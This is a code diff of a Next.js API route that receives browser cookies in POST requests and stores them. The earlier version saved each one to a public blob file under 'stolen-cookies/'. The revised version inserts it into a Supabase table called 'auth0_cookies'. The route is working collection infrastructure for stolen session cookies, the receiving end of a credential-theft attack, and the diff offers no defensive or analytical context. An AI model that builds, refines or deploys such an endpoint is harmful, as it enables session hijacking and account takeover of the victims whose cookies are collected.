@@ -1,24 +1,34 @@
 import { NextResponse } from "next/server";
-import { put } from "@vercel/blob";
+import { createClient } from "@supabase/supabase-js";
+
+// Initialize Supabase client using environment variables
+const supabase = createClient(
+    process.env.NEXT_PUBLIC_SUPABASE_URL, 
+    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY
+  );
+  
 
 export async function POST(req) {
   try {
     const { cookie } = await req.json();
 
-    console.log("cookie", cookie);
-    
+    console.log("Received cookie:", cookie);
 
     if (!cookie) {
       return NextResponse.json({ error: "No cookie provided" }, { status: 400 });
     }
 
-    // Generate a unique filename based on timestamp
-    const fileName = `stolen-cookies/${Date.now()}.txt`;
+    // Store the cookie in the Supabase `auth0_cookies` table
+    const { data, error } = await supabase
+      .from("auth0_cookies")
+      .insert([{ value: cookie }]);
 
-    // Save the cookie data
-    const { url } = await put(fileName, cookie, { access: "public" });
+    if (error) {
+      console.error("Supabase insert error:", error);
+      return NextResponse.json({ error: "Failed to save cookie to database" }, { status: 500 });
+    }
 
-    return NextResponse.json({ message: "Cookie saved", url });
+    return NextResponse.json({ message: "Cookie saved successfully", data });
   } catch (error) {
     console.error("Error saving cookie:", error);
     return NextResponse.json({ error: "Internal server error" }, { status: 500 });
